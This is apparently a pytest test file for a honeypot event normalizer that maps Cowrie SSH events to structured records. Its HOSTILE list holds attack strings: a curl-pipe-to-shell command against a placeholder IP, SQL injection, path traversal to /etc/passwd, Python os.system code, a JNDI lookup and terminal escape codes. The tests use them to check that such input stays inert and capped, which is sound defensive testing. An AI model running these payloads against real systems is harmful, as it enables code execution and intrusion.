"""Canonical normalized events (FR-005, FR-005b, FR-013; ADR-024 D6, D7)."""

from __future__ import annotations

import pytest

from intel_service.events import RAW_TEXT_FIELD, SOURCE_TYPE_BY_MODE, normalize_event
from tests.fixtures.cowrie_events import accepted

HOSTILE = [
    "'; DROP TABLE intel.attack_event; --",
    "$(curl -s http://198.51.100.9/p | sh)",
    "`id`",
    "../../../../etc/passwd",
    "__import__('os').system('id')",
    "{{7*7}} ${jndi:ldap://198.51.100.9/a}",
    "\x1b[2J\x1b[31mred\x1b[0m",
    "nul\x00byte",
    "A" * 60000,  # within the 64 KiB line cap, over every field cap
]


@pytest.mark.parametrize(
    ("eventid", "event_type", "raw_text"),
    [
        ("cowrie.command.input", "command_input", "uname -a"),
        ("cowrie.session.file_download", "file_download", "http://198.51.100.40/x.sh"),
        ("cowrie.session.file_upload", "file_upload", "up.bin"),
        ("cowrie.client.version", "client_version", "SSH-2.0-Go"),
        ("cowrie.login.failed", "login_failed", "root"),
        ("cowrie.login.success", "login_success", "root"),
        ("cowrie.session.connect", "session_connect", ""),
        ("cowrie.session.closed", "session_closed", ""),
        ("cowrie.client.kex", "other", ""),  # unknown-to-the-enum Cowrie type
        ("cowrie.command.failed", "other", ""),  # D7 lists no text field for `other`
    ],
)
def test_d7_raw_text_mapping(eventid: str, event_type: str, raw_text: str) -> None:
    event = normalize_event(1, "fixture", accepted(eventid))
    assert (event.event_type, event.raw_text, event.normalized_text) == (
        event_type,
        raw_text,
        raw_text,
    )


def test_mapping_covers_exactly_the_approved_event_types() -> None:
    assert RAW_TEXT_FIELD == {
        "command_input": "input",
        "file_download": "url",
        "file_upload": "filename",
        "client_version": "version",
        "login_failed": "username",
        "login_success": "username",
    }


def test_login_fields_are_structured_and_the_secret_never_reaches_raw_text() -> None:
    guess = "guess-" + "7x"  # an attacker's submitted string, not a credential of ours
    event = normalize_event(1, "fixture", accepted("cowrie.login.success", password=guess))
    assert (event.username, event.attempted_secret) == ("root", guess)
    assert guess not in event.raw_text + event.normalized_text
    other = normalize_event(1, "fixture", accepted("cowrie.command.input"))
    assert (other.username, other.attempted_secret) == (None, None)


def test_long_login_fields_are_capped_and_flagged() -> None:
    event = normalize_event(1, "fixture", accepted("cowrie.login.failed", username="u" * 300))
    assert event.username == "u" * 256
    assert event.truncated


def test_artifact_hash_only_for_transfer_events() -> None:
    assert normalize_event(1, "fixture", accepted("cowrie.session.file_download")).artifact_sha256
    assert normalize_event(1, "fixture", accepted("cowrie.command.input")).artifact_sha256 is None


def test_src_port_only_from_the_connect_event() -> None:
    connect = normalize_event(1, "fixture", accepted("cowrie.session.connect"))
    assert (connect.src_ip, connect.src_port) == ("203.0.113.7", 40000)
    command = normalize_event(2, "fixture", accepted("cowrie.command.input", src_port=1))
    assert command.src_port is None


def test_source_type_comes_only_from_ingest_mode() -> None:
    spoofed = accepted(
        "cowrie.command.input", ingest_mode="live", source_type="honeypot", kind="heartbeat"
    )
    assert normalize_event(1, "fixture", spoofed).source_type == "synthetic"
    assert normalize_event(1, "live", spoofed).source_type == "honeypot"
    assert SOURCE_TYPE_BY_MODE == {"live": "honeypot", "fixture": "synthetic"}
    with pytest.raises(KeyError):
        normalize_event(1, "honeypot", spoofed)  # not an ingest mode: fail closed


@pytest.mark.parametrize("text", HOSTILE, ids=range(len(HOSTILE)))
def test_hostile_text_is_inert_bounded_data(text: str) -> None:
    event = normalize_event(1, "fixture", accepted("cowrie.command.input", input=text))
    assert len(event.raw_text.encode("utf-8")) <= 4096
    assert len(event.normalized_text) <= 1024
    assert "\x00" not in event.raw_text + event.normalized_text
    assert "\x1b" not in event.normalized_text
    assert event.truncated is (len(text) > 1024)
